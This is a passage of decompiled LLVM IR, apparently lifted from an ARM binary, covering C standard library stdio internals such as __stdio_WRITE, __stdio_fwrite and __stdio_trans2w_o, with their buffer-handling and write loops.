  uselistorder i32 %v1_18578, { 1, 0 }
  uselistorder i32 %v2_18574, { 0, 2, 1 }
  uselistorder i32 %v1_18544, { 1, 0 }
  uselistorder i32 %v2_1853c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1856828, { 1, 0 }
  uselistorder i32 %v2_184fc1, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 5, 1, 6, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18590, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_18584, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1853c, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_185a0 = load i32, i32* @r4, align 4
  store i32 %v3_185a0, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_185b82 = icmp eq i32 %arg3, 0
  store i1 %v2_185b82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185b82, label %dec_label_pc_18648, label %dec_label_pc_185c0

dec_label_pc_185b8thread-pre-split:               ; preds = %dec_label_pc_185c0
  %v3_185d8 = load i32, i32* %r6.global-to-local, align 4
  %v5_185d8 = add i32 %v3_185d8, %v3_185d0
  store i32 %v5_185d8, i32* %r6.global-to-local, align 4
  %v4_185dc = load i32, i32* %r5.global-to-local, align 4
  %v5_185dc = sub i32 %v4_185dc, %v3_185d0
  store i32 %v5_185dc, i32* %r5.global-to-local, align 4
  %v2_185b8 = icmp eq i32 %v5_185dc, 0
  store i1 %v2_185b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185b8, label %dec_label_pc_185b8.dec_label_pc_18648.loopexit_crit_edge, label %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge

dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge: ; preds = %dec_label_pc_185b8thread-pre-split
  %v3_185c0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_185cc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_185c0

dec_label_pc_185c0:                               ; preds = %entry, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge
  %v0_185cc = phi i32 [ %v0_185cc.pre, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge ], [ %tmp, %entry ]
  %v0_185c8 = phi i32 [ %v5_185d8, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge ], [ %arg2, %entry ]
  %v3_185c0 = phi i32 [ %v3_185c0.pre, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge ], [ 2147483647, %entry ]
  %v0_185c4.in = phi i32 [ %v5_185dc, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge ], [ %arg3, %entry ]
  %v3_185c4 = phi i32 [ %v5_185dc, %dec_label_pc_185b8thread-pre-split.dec_label_pc_185c0_crit_edge ], [ %arg3, %entry ]
  %v0_185c4 = icmp slt i32 %v0_185c4.in, 0
  %storemerge = select i1 %v0_185c4, i32 %v3_185c0, i32 %v3_185c4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_185c8, i32* %r1.global-to-local, align 4
  %v1_185cc = add i32 %v0_185cc, 4
  %v2_185cc = inttoptr i32 %v1_185cc to i32*
  %v3_185cc = load i32, i32* %v2_185cc, align 4
  %v3_185d0 = call i32 @__GI_write(i32 %v3_185cc, i32 %v0_185c8)
  %v1_185d4 = icmp slt i32 %v3_185d0, 0
  %v2_185d4 = icmp eq i32 %v3_185d0, 0
  store i1 %v2_185d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_185d4, label %dec_label_pc_185e4, label %dec_label_pc_185b8thread-pre-split

dec_label_pc_185e4:                               ; preds = %dec_label_pc_185c0
  %v0_185e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_185e4 = inttoptr i32 %v0_185e4 to i16*
  %v2_185e4 = load i16, i16* %v1_185e4, align 2
  %v3_185e4 = zext i16 %v2_185e4 to i32
  store i32 %v3_185e4, i32* %r3.global-to-local, align 4
  %v1_185e8 = add i32 %v0_185e4, 8
  store i32 %v1_185e8, i32* %r1.global-to-local, align 4
  %v1_185ec = inttoptr i32 %v1_185e8 to i32*
  %v2_185ec = load i32, i32* %v1_185ec, align 4
  store i32 %v2_185ec, i32* %r1.global-to-local, align 4
  %v3_185ec = add i32 %v0_185e4, 12
  %v4_185ec = inttoptr i32 %v3_185ec to i32*
  %v5_185ec = load i32, i32* %v4_185ec, align 4
  %v1_185f0 = or i32 %v3_185e4, 8
  store i32 %v1_185f0, i32* %r3.global-to-local, align 4
  %v2_185f4 = sub i32 %v5_185ec, %v2_185ec
  store i32 %v2_185f4, i32* %r2.global-to-local, align 4
  %v9_185f4 = icmp eq i32 %v5_185ec, %v2_185ec
  store i1 %v9_185f4, i1* %cpsr_z.global-to-local, align 1
  %v1_185f8 = trunc i32 %v1_185f0 to i16
  store i16 %v1_185f8, i16* %v1_185e4, align 2
  br i1 %v9_185f4, label %dec_label_pc_185e4.dec_label_pc_18644_crit_edge, label %dec_label_pc_18600

dec_label_pc_185e4.dec_label_pc_18644_crit_edge:  ; preds = %dec_label_pc_185e4
  %v0_18644.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18644

dec_label_pc_18600:                               ; preds = %dec_label_pc_185e4
  %v0_18600 = load i32, i32* %r2.global-to-local, align 4
  %v1_18600 = load i32, i32* %r5.global-to-local, align 4
  %v3_18600 = icmp ult i32 %v0_18600, %v1_18600
  %v9_18600 = icmp eq i32 %v0_18600, %v1_18600
  store i1 %v9_18600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18600, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_18600
  store i32 %v1_18600, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18600, %bb23
  %v2_18614.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_18628
  %v2_18614 = phi i32 [ %v2_18614.pre, %.preheader ], [ %v1_1862c, %dec_label_pc_18628 ]
  %v0_18608 = load i32, i32* %r6.global-to-local, align 4
  %v1_18608 = inttoptr i32 %v0_18608 to i8*
  %v2_18608 = load i8, i8* %v1_18608, align 1
  %v3_18608 = zext i8 %v2_18608 to i32
  store i32 %v3_18608, i32* %r3.global-to-local, align 4
  %v7_1860c = icmp eq i8 %v2_18608, 10
  store i1 %v7_1860c, i1* %cpsr_z.global-to-local, align 1
  %v1_18610 = add i32 %v0_18608, 1
  store i32 %v1_18610, i32* %r6.global-to-local, align 4
  %v3_18614 = inttoptr i32 %v2_18614 to i8*
  store i8 %v2_18608, i8* %v3_18614, align 1
  %v0_18618 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18618, label %dec_label_pc_1861c, label %dec_label_pc_18628

dec_label_pc_1861c:                               ; preds = %bb24
  %v0_1861c = load i32, i32* %r4.global-to-local, align 4
  %v1_1861c = inttoptr i32 %v0_1861c to i16*
  %v2_1861c = load i16, i16* %v1_1861c, align 2
  %v3_1861c = zext i16 %v2_1861c to i32
  store i32 %v3_1861c, i32* %r3.global-to-local, align 4
  %v1_18620 = and i32 %v3_1861c, 256
  %v2_18620 = icmp eq i32 %v1_18620, 0
  store i1 %v2_18620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18620, label %dec_label_pc_18628, label %dec_label_pc_1861c.dec_label_pc_18634_crit_edge

dec_label_pc_1861c.dec_label_pc_18634_crit_edge:  ; preds = %dec_label_pc_1861c
  %v0_18638.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18634

dec_label_pc_18628:                               ; preds = %dec_label_pc_1861c, %bb24
  %v0_18628 = load i32, i32* %r2.global-to-local, align 4
  %v1_18628 = add i32 %v0_18628, -1
  store i32 %v1_18628, i32* %r2.global-to-local, align 4
  %v7_18628 = icmp eq i32 %v0_18628, 1
  store i1 %v7_18628, i1* %cpsr_z.global-to-local, align 1
  %v0_1862c = load i32, i32* %r1.global-to-local, align 4
  %v1_1862c = add i32 %v0_1862c, 1
  store i32 %v1_1862c, i32* %r1.global-to-local, align 4
  br i1 %v7_18628, label %dec_label_pc_18628.dec_label_pc_18634_crit_edge, label %bb24

dec_label_pc_18628.dec_label_pc_18634_crit_edge:  ; preds = %dec_label_pc_18628
  %v0_18634.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18634

dec_label_pc_18634:                               ; preds = %dec_label_pc_1861c.dec_label_pc_18634_crit_edge, %dec_label_pc_18628.dec_label_pc_18634_crit_edge
  %v0_18638 = phi i32 [ %v1_1862c, %dec_label_pc_18628.dec_label_pc_18634_crit_edge ], [ %v0_18638.pre, %dec_label_pc_1861c.dec_label_pc_18634_crit_edge ]
  %v0_18634 = phi i32 [ %v0_18634.pre, %dec_label_pc_18628.dec_label_pc_18634_crit_edge ], [ %v0_1861c, %dec_label_pc_1861c.dec_label_pc_18634_crit_edge ]
  %v1_18634 = add i32 %v0_18634, 8
  %v2_18634 = inttoptr i32 %v1_18634 to i32*
  %v3_18634 = load i32, i32* %v2_18634, align 4
  store i32 %v3_18634, i32* %r3.global-to-local, align 4
  %v2_18638 = add i32 %v0_18634, 16
  %v3_18638 = inttoptr i32 %v2_18638 to i32*
  store i32 %v0_18638, i32* %v3_18638, align 4
  %v0_1863c = load i32, i32* %r3.global-to-local, align 4
  %v1_1863c = load i32, i32* %r1.global-to-local, align 4
  %v2_1863c = sub i32 %v1_1863c, %v0_1863c
  store i32 %v2_1863c, i32* %r3.global-to-local, align 4
  %v1_18640 = load i32, i32* %r5.global-to-local, align 4
  %v2_18640 = sub i32 %v1_18640, %v2_1863c
  store i32 %v2_18640, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_185e4.dec_label_pc_18644_crit_edge, %dec_label_pc_18634
  %v0_18644 = phi i32 [ %v0_18644.pre, %dec_label_pc_185e4.dec_label_pc_18644_crit_edge ], [ %v2_18640, %dec_label_pc_18634 ]
  %v1_18644 = load i32, i32* @r7, align 4
  %v2_18644 = sub i32 %v1_18644, %v0_18644
  br label %dec_label_pc_18648

dec_label_pc_185b8.dec_label_pc_18648.loopexit_crit_edge: ; preds = %dec_label_pc_185b8thread-pre-split
  %v0_18648.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18648

dec_label_pc_18648:                               ; preds = %entry, %dec_label_pc_185b8.dec_label_pc_18648.loopexit_crit_edge, %dec_label_pc_18644
  %v0_18648 = phi i32 [ %v2_18644, %dec_label_pc_18644 ], [ %v0_18648.pre.pre, %dec_label_pc_185b8.dec_label_pc_18648.loopexit_crit_edge ], [ 0, %entry ]
  %v2_1864c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1864c, i32* %r4.global-to-local, align 4
  ret i32 %v0_18648

; uselistorder directives
  uselistorder i32 %v0_18634, { 1, 0 }
  uselistorder i32 %v1_1862c, { 0, 2, 1 }
  uselistorder i32 %v0_18628, { 1, 0 }
  uselistorder i32 %v1_18600, { 0, 2, 1 }
  uselistorder i32 %v0_18600, { 1, 0 }
  uselistorder i32 %v5_185ec, { 1, 0 }
  uselistorder i32 %v2_185ec, { 1, 0, 2 }
  uselistorder i32 %v3_185d0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_185c8, { 1, 0 }
  uselistorder i32 %v5_185dc, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 2, 3, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_18648, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18644, { 1, 0 }
  uselistorder label %dec_label_pc_18634, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_185c0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_18654 = load i32, i32* @r4, align 4
  store i32 %v3_18654, i32* %stack_var_-20, align 4
  %v6_18654 = load i32, i32* @r5, align 4
  %v9_18654 = load i32, i32* @r6, align 4
  %v12_18654 = load i32, i32* @r7, align 4
  %v3_18658 = load i16, i16* %arg3, align 2
  %v4_18658 = zext i16 %v3_18658 to i32
  %v1_1865c = and i32 %v4_18658, 512
  store i32 %v1_1865c, i32* @r4, align 4
  %v2_1865c = icmp eq i32 %v1_1865c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1865c, label %dec_label_pc_18674, label %dec_label_pc_18770

dec_label_pc_18674:                               ; preds = %entry
  %v2_18674 = add i32 %tmp, 4
  %v3_18674 = inttoptr i32 %v2_18674 to i32*
  %v4_18674 = load i32, i32* %v3_18674, align 4
  %v2_1867c = add i32 %tmp, 16
  %v3_1867c = inttoptr i32 %v2_1867c to i32*
  %v4_1867c = load i32, i32* %v3_1867c, align 4
  store i32 %v4_1867c, i32* @r0, align 4
  %v2_18680 = add i32 %tmp, 12
  %v3_18680 = inttoptr i32 %v2_18680 to i32*
  %v4_18680 = load i32, i32* %v3_18680, align 4
  store i32 %v4_18680, i32* @r3, align 4
  %v4_18684 = icmp eq i32 %v4_18674, -2
  %v2_18688 = sub i32 %v4_18680, %v4_1867c
  br i1 %v4_18684, label %dec_label_pc_18688, label %dec_label_pc_186b0

dec_label_pc_18688:                               ; preds = %dec_label_pc_18674
  %v3_1868c = icmp ugt i32 %v2_18688, %arg2
  br i1 %v3_1868c, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_18688
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18688, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_18688, %dec_label_pc_18688 ]
  %v0_18694 = phi i32 [ %arg2, %bb ], [ %v2_18688, %dec_label_pc_18688 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_18694, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1869c = call i32 @memcpy()
  %v0_186a0 = load i32, i32* @r5, align 4
  %v1_186a0 = add i32 %v0_186a0, 16
  %v2_186a0 = inttoptr i32 %v1_186a0 to i32*
  %v3_186a0 = load i32, i32* %v2_186a0, align 4
  %v1_186a4 = load i32, i32* @r4, align 4
  %v2_186a4 = add i32 %v1_186a4, %v3_186a0
  store i32 %v2_186a4, i32* %v2_186a0, align 4
  br label %dec_label_pc_18784

dec_label_pc_186b0:                               ; preds = %dec_label_pc_18674
  store i32 %v2_18688, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_18688, %arg2
  br i1 %tmp18, label %dec_label_pc_18750, label %dec_label_pc_186bc

dec_label_pc_186bc:                               ; preds = %dec_label_pc_186b0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_186c4 = call i32 @memcpy()
  %v0_186c8 = load i32, i32* @r5, align 4
  %v1_186c8 = add i32 %v0_186c8, 16
  %v2_186c8 = inttoptr i32 %v1_186c8 to i32*
  %v3_186c8 = load i32, i32* %v2_186c8, align 4
  %v1_186cc = inttoptr i32 %v0_186c8 to i16*
  %v2_186cc = load i16, i16* %v1_186cc, align 2
  %v1_186d0 = load i32, i32* @r6, align 4
  %v2_186d0 = add i32 %v1_186d0, %v3_186c8
  %v1_186d4 = and i16 %v2_186cc, 256
  %v2_186d4 = icmp eq i16 %v1_186d4, 0
  store i32 %v2_186d0, i32* %v2_186c8, align 4
  br i1 %v2_186d4, label %dec_label_pc_18784, label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %dec_label_pc_186bc
  %v0_186e0 = load i32, i32* @r7, align 4
  %v0_186e8 = load i32, i32* @r6, align 4
  %v4_186ec = call i32 @memrchr(i32 %v0_186e0, i32 10, i32 %v0_186e8, i32 %v2_186d0)
  %v2_186f0 = icmp eq i32 %v4_186ec, 0
  br i1 %v2_186f0, label %dec_label_pc_18784, label %dec_label_pc_186f8

dec_label_pc_186f8:                               ; preds = %dec_label_pc_186e0
  %v0_186f8 = load i32, i32* @r5, align 4
  store i32 %v0_186f8, i32* @r0, align 4
  %v0_186fc = call i32 @__stdio_wcommit()
  %v2_18700 = icmp eq i32 %v0_186fc, 0
  br i1 %v2_18700, label %dec_label_pc_18784, label %dec_label_pc_18708

dec_label_pc_18708:                               ; preds = %dec_label_pc_186f8
  %v1_18708 = load i32, i32* @r6, align 4
  %v3_18708 = icmp uge i32 %v0_186fc, %v1_18708
  %v1_18708.v0_186fc = select i1 %v3_18708, i32 %v1_18708, i32 %v0_186fc
  store i32 %v1_18708.v0_186fc, i32* @r4, align 4
  %v2_18714 = sub i32 %v1_18708, %v1_18708.v0_186fc
  %v0_18718 = load i32, i32* @r7, align 4
  %v2_18718 = add i32 %v0_18718, %v2_18714
  store i32 %v2_18718, i32* %r7.global-to-local, align 4
  store i32 %v2_18718, i32* @r0, align 4
  store i32 %v1_18708.v0_186fc, i32* @r2, align 4
  %v4_18728 = call i32 @__GI_memchr(i32 %v2_18718, i32 10, i32 %v1_18708.v0_186fc, i32 %v2_18714)
  %v2_1872c = icmp eq i32 %v4_18728, 0
  br i1 %v2_1872c, label %dec_label_pc_18784, label %dec_label_pc_18734

dec_label_pc_18734:                               ; preds = %dec_label_pc_18708
  %v0_18734 = load i32, i32* @r5, align 4
  %v1_18734 = add i32 %v0_18734, 16
  %v2_18734 = inttoptr i32 %v1_18734 to i32*
  %v3_18734 = load i32, i32* %v2_18734, align 4
  %v0_18738 = load i32, i32* %r7.global-to-local, align 4
  %v1_18738 = load i32, i32* @r4, align 4
  %v2_18738 = sub i32 %v0_18738, %v4_18728
  %v2_1873c = add i32 %v2_18738, %v1_18738
  %v2_18740 = sub i32 %v3_18734, %v2_1873c
  %v1_18744 = load i32, i32* @r6, align 4
  %v2_18744 = sub i32 %v1_18744, %v2_1873c
  store i32 %v2_18744, i32* @r6, align 4
  store i32 %v2_18740, i32* %v2_18734, align 4
  br label %dec_label_pc_18784

dec_label_pc_18750:                               ; preds = %dec_label_pc_186b0
  %v2_18750 = add i32 %tmp, 8
  %v3_18750 = inttoptr i32 %v2_18750 to i32*
  %v4_18750 = load i32, i32* %v3_18750, align 4
  %v9_18754 = icmp eq i32 %v4_1867c, %v4_18750
  br i1 %v9_18754, label %dec_label_pc_18770, label %dec_label_pc_1875c

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18750
  store i32 %tmp, i32* @r0, align 4
  %v0_18760 = call i32 @__stdio_wcommit()
  %v2_18764 = icmp eq i32 %v0_18760, 0
  br i1 %v2_18764, label %dec_label_pc_1875c.dec_label_pc_18770_crit_edge, label %bb15

dec_label_pc_1875c.dec_label_pc_18770_crit_edge:  ; preds = %dec_label_pc_1875c
  %v0_18770.pre = load i32, i32* @r6, align 4
  %v0_18774.pre = load i32, i32* @r5, align 4
  %v0_18778.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18770

bb15:                                             ; preds = %dec_label_pc_1875c
  %v1_18768 = load i32, i32* @r4, align 4
  store i32 %v1_18768, i32* @r6, align 4
  br label %dec_label_pc_18784

dec_label_pc_18770:                               ; preds = %dec_label_pc_1875c.dec_label_pc_18770_crit_edge, %entry, %dec_label_pc_18750
  %v0_18778 = phi i32 [ %v0_18778.pre, %dec_label_pc_1875c.dec_label_pc_18770_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_18750 ]
  %v0_18774 = phi i32 [ %v0_18774.pre, %dec_label_pc_1875c.dec_label_pc_18770_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_18750 ]
  %v0_18770 = phi i32 [ %v0_18770.pre, %dec_label_pc_1875c.dec_label_pc_18770_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_18750 ]
  %v1_18774 = inttoptr i32 %v0_18774 to i16*
  %v5_1877c = call i32 @__stdio_WRITE(i16* %v1_18774, i32 %v0_18778, i32 %v0_18770)
  store i32 %v5_1877c, i32* @r6, align 4
  br label %dec_label_pc_18784

dec_label_pc_18784:                               ; preds = %bb15, %dec_label_pc_18708, %dec_label_pc_186f8, %dec_label_pc_186e0, %dec_label_pc_186bc, %dec_label_pc_18734, %bb12, %dec_label_pc_18770
  %v0_18784 = load i32, i32* @r6, align 4
  %v2_1878c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1878c, i32* @r4, align 4
  store i32 %v6_18654, i32* @r5, align 4
  store i32 %v9_18654, i32* @r6, align 4
  store i32 %v12_18654, i32* @r7, align 4
  ret i32 %v0_18784

; uselistorder directives
  uselistorder i32 %v2_1873c, { 1, 0 }
  uselistorder i32 %v2_18714, { 1, 0 }
  uselistorder i32 %v1_18708.v0_186fc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18708, { 1, 0, 2 }
  uselistorder i32 %v2_18688, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_18784, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_18770, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18794 = load i32, i32* @r4, align 4
  store i32 %v3_18794, i32* %stack_var_-8, align 4
  %v3_18798 = load i16, i16* %arg1, align 2
  %v4_18798 = zext i16 %v3_18798 to i32
  %v2_1879c = and i32 %v4_18798, %arg2
  %v4_1879c = icmp eq i32 %v2_1879c, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1879c, label %dec_label_pc_187a8, label %dec_label_pc_187b8

dec_label_pc_187a8:                               ; preds = %entry
  %v1_187a8 = and i32 %v4_18798, 2176
  %v2_187a8 = icmp eq i32 %v1_187a8, 0
  br i1 %v2_187a8, label %dec_label_pc_187b0, label %dec_label_pc_187c4

dec_label_pc_187b0:                               ; preds = %dec_label_pc_187a8
  %v2_187b0 = or i32 %v4_18798, %arg2
  %v1_187b4 = trunc i32 %v2_187b0 to i16
  store i16 %v1_187b4, i16* %arg1, align 2
  %v0_187b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_187b8

dec_label_pc_187b8:                               ; preds = %entry, %dec_label_pc_187b0
  %v0_187f4 = phi i32 [ %tmp, %entry ], [ %v0_187b8.pre, %dec_label_pc_187b0 ]
  %v1_187b8 = inttoptr i32 %v0_187f4 to i16*
  %v2_187b8 = load i16, i16* %v1_187b8, align 2
  %v3_187b8 = zext i16 %v2_187b8 to i32
  store i32 %v3_187b8, i32* @ip, align 4
  %v1_187bc = and i32 %v3_187b8, 32
  %v2_187bc = icmp eq i32 %v1_187bc, 0
  br i1 %v2_187bc, label %dec_label_pc_187e4, label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_187a8, %dec_label_pc_187b8
  %v0_187c4 = call i32 @__GI___errno_location()
  store i32 %v0_187c4, i32* %r0.global-to-local, align 4
  %v2_187cc = inttoptr i32 %v0_187c4 to i32*
  store i32 9, i32* %v2_187cc, align 4
  br label %dec_label_pc_187d0

dec_label_pc_187d0:                               ; preds = %dec_label_pc_1880c, %dec_label_pc_187c4
  %v0_187d0 = load i32, i32* @r4, align 4
  %v1_187d0 = inttoptr i32 %v0_187d0 to i16*
  %v2_187d0 = load i16, i16* %v1_187d0, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_187d8 = or i16 %v2_187d0, 8
  store i16 %v1_187d8, i16* %v1_187d0, align 2
  br label %bb11

dec_label_pc_187e4:                               ; preds = %dec_label_pc_187b8
  %tmp14 = urem i16 %v2_187b8, 4
  %v2_187e4 = icmp eq i16 %tmp14, 0
  br i1 %v2_187e4, label %dec_label_pc_18840, label %dec_label_pc_187ec

dec_label_pc_187ec:                               ; preds = %dec_label_pc_187e4
  %v1_187ec = and i32 %v3_187b8, 4
  store i32 %v1_187ec, i32* @r1, align 4
  %v2_187ec = icmp eq i32 %v1_187ec, 0
  br i1 %v2_187ec, label %dec_label_pc_187f4, label %dec_label_pc_18824

dec_label_pc_187f4:                               ; preds = %dec_label_pc_187ec
  %v1_187f4 = add i32 %v0_187f4, 20
  %v2_187f4 = inttoptr i32 %v1_187f4 to i32*
  %v3_187f4 = load i32, i32* %v2_187f4, align 4
  store i32 %v3_187f4, i32* %r2.global-to-local, align 4
  %v1_187f8 = add i32 %v0_187f4, 16
  %v2_187f8 = inttoptr i32 %v1_187f8 to i32*
  %v3_187f8 = load i32, i32* %v2_187f8, align 4
  %v9_187fc = icmp eq i32 %v3_187f4, %v3_187f8
  br i1 %v9_187fc, label %dec_label_pc_18804, label %dec_label_pc_1880c

dec_label_pc_18804:                               ; preds = %dec_label_pc_187f4
  %v1_18804 = and i32 %v3_187b8, 2
  %v2_18804 = icmp eq i32 %v1_18804, 0
  br i1 %v2_18804, label %dec_label_pc_18824, label %dec_label_pc_1880c

dec_label_pc_1880c:                               ; preds = %dec_label_pc_187f4, %dec_label_pc_18804
  %v1_1880c = and i32 %v3_187b8, 1024
  %tmp12 = udiv i32 %v1_1880c, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_18818 = call i32 @__GI_fseek()
  store i32 %v0_18818, i32* %r0.global-to-local, align 4
  %v2_1881c = icmp eq i32 %v0_18818, 0
  br i1 %v2_1881c, label %.dec_label_pc_18824_crit_edge, label %dec_label_pc_187d0

.dec_label_pc_18824_crit_edge:                    ; preds = %dec_label_pc_1880c
  %v0_18824.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18824

dec_label_pc_18824:                               ; preds = %.dec_label_pc_18824_crit_edge, %dec_label_pc_187ec, %dec_label_pc_18804
  %v2_18830 = phi i32 [ %v0_18824.pre, %.dec_label_pc_18824_crit_edge ], [ %v0_187f4, %dec_label_pc_187ec ], [ %v0_187f4, %dec_label_pc_18804 ]
  %v1_18824 = inttoptr i32 %v2_18830 to i16*
  %v2_18824 = load i16, i16* %v1_18824, align 2
  %v1_18828 = add i32 %v2_18830, 8
  %v2_18828 = inttoptr i32 %v1_18828 to i32*
  %v3_18828 = load i32, i32* %v2_18828, align 4
  store i32 %v3_18828, i32* %r2.global-to-local, align 4
  %v1_1882c = and i16 %v2_18824, -4
  store i16 %v1_1882c, i16* %v1_18824, align 2
  %v0_18834 = load i32, i32* %r2.global-to-local, align 4
  %v1_18834 = load i32, i32* @r4, align 4
  %v2_18834 = add i32 %v1_18834, 20
  %v3_18834 = inttoptr i32 %v2_18834 to i32*
  store i32 %v0_18834, i32* %v3_18834, align 4
  %v0_18838 = load i32, i32* %r2.global-to-local, align 4
  %v1_18838 = load i32, i32* @r4, align 4
  %v2_18838 = add i32 %v1_18838, 24
  %v3_18838 = inttoptr i32 %v2_18838 to i32*
  store i32 %v0_18838, i32* %v3_18838, align 4
  %v0_1883c = load i32, i32* %r2.global-to-local, align 4
  %v1_1883c = load i32, i32* @r4, align 4
  %v2_1883c = add i32 %v1_1883c, 16
